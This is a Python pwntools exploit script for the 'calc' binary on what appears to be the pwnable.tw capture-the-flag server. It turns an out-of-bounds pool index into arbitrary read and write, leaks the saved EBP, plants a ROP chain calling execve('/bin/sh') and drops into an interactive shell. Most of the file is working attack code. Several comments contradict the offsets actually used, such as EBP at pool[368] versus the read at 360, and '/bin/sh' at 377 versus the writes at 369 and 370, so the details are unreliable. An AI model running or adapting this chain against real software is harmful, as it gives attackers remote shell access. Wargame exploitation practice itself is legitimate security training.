#!/usr/bin/env python3
from pwn import *
from pwnlib.util.packing import u32

# -------------------------------------------------------------------------
# Setup: Target the local binary (or remote server)
# -------------------------------------------------------------------------
# Switch to remote('chall.pwnable.tw', 10100) if you are attacking the live server
p = remote('chall.pwnable.tw', 10100)

# The calculator prints a welcome banner, we need to consume it first.
p.recvline() 

# -------------------------------------------------------------------------
# Our Arsenal: Arbitrary Read & Write Primitives
# -------------------------------------------------------------------------
def read_val(offset):
    """
    Step 2: Read memory at the given pool offset.
    Sends '+OFFSET' and parses the integer response.
    """
    p.sendline(f"+{offset}".encode())
    return int(p.recvline().strip())

def write_val(offset, target_value):
    """
    Step 4: Write an arbitrary value to the given pool offset.
    Because the bug works via addition (pool[offset] += input), 
    we must calculate the mathematical difference.
    """
    current_value = read_val(offset)
    
    # Calculate difference (this handles both positive and negative jumps)
    diff = target_value - current_value
    
    if diff > 0:
        payload = f"+{offset}+{diff}"
    elif diff < 0:
        payload = f"+{offset}{diff}" # diff already includes the minus sign (e.g. +361-50)
    else:
        return # Value is already correct, no need to overwrite
        
    p.sendline(payload.encode())
    print(f"[*] Payload sent: {payload}")
    p.recvline() # Consume the calculated output so the buffer stays clean

# -------------------------------------------------------------------------
# Step 3: Calculate the ROP Chain and Leak Stack Addresses
# -------------------------------------------------------------------------
log.info("Leaking saved EBP to calculate precise stack addresses...")
saved_ebp = read_val(360)
log.success(f"Saved EBP (pool[368]) is at: {hex(saved_ebp)}")

# We will write the string "/bin/sh\x00" starting at pool[377].
# Since pool[368] is the EBP, pool[377] is exactly 9 slots away (9 slots * 4 bytes = 36 bytes).
bin_sh_addr = saved_ebp + 36 
log.success(f"Calculated address for '/bin/sh': {hex(bin_sh_addr)}")

# --- ROP Gadgets ---
# (Note: If your binary differs slightly, find these using: ROPgadget --binary ./calc)
POP_EAX     = 0x0805c34b  # pop eax ; ret
POP_EDX     = 0x080701aa  # pop edx ; ret
POP_ECX_EBX = 0x080701d1  # pop ecx ; pop ebx ; ret
INT_80      = 0x08049a21  # int 0x80 (syscall trigger)

# "/bin/sh\x00" split into two 32-bit (4-byte) integer chunks
BIN_CHUNK_1 = u32(b"/bin")
BIN_CHUNK_2 = u32(b"/sh\x00")

# -------------------------------------------------------------------------
# Step 4: Write the Payload
# -------------------------------------------------------------------------
# We start overwriting at pool[368], which is the function's Return Address.
rop_chain = {
    361: POP_EAX,
    362: 11,               # SYS_execve syscall number is 11
    363: POP_EDX,
    364: 0,                # EDX = 0 (envp array)
    365: POP_ECX_EBX,
    366: 0,                # ECX = 0 (argv array)
    367: bin_sh_addr,      # EBX = Pointer to our "/bin/sh" string
    368: INT_80,           # Execute syscall!
    369: BIN_CHUNK_1,      # Write "/bin" into memory here
    370: BIN_CHUNK_2       # Write "/sh\x00" into memory here
}

log.info("Writing ROP chain to the stack, bypassing canaries...")
for offset, value in rop_chain.items():
    log.info(f"Writing {hex(value)} to pool[{offset}]")
    write_val(offset, value)

log.success("ROP chain completely injected!")

# -------------------------------------------------------------------------
# Step 5: Trigger the Payload
# -------------------------------------------------------------------------
log.info("Sending invalid math expression to force function return...")
# Sending text instead of math breaks the calculator's input loop.
# The function will call `ret`, popping our first gadget (POP_EAX) off the stack!
#p.sendline(b"PWNED") 

# Drop into interactive mode to use your new shell!
p.interactive()